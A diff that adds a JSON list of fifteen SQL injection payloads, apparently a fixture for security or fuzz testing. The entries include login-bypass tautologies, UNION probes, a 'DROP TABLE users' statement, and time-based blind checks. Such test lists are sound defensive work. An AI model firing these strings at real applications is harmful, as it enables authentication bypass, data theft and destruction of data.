@@ -1,0 +1,17 @@
+[
+  "' OR '1'='1",
+  "' OR '1'='1' --",
+  "' OR '1'='1' /*",
+  "admin'--",
+  "' UNION SELECT NULL--",
+  "' UNION SELECT NULL,NULL--",
+  "'; DROP TABLE users;--",
+  "1; SELECT * FROM information_schema.tables--",
+  "' AND 1=CONVERT(int,(SELECT @@version))--",
+  "' OR EXISTS(SELECT * FROM users)--",
+  "1' ORDER BY 1--",
+  "1' ORDER BY 100--",
+  "' AND SLEEP(5)--",
+  "' OR BENCHMARK(10000000,SHA1('test'))--",
+  "'; WAITFOR DELAY '0:0:5'--"
+]
